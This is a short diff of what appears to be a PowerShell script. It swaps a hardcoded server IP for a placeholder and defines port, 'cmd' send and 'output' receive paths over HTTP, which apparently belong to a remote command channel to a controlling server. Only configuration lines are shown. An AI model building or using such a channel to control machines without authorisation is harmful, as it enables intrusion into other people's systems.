@@ -30,7 +30,7 @@ If you want to debug the script the verbose option will output a lot of info dur
 # )
 
 $port = 80
-$server = "100.26.120.221"
+$server = "----SERVERIP----"
 $SEND_PATH = "cmd"
 $RECV_PATH = "output"
 $PROTOCOL = "http"
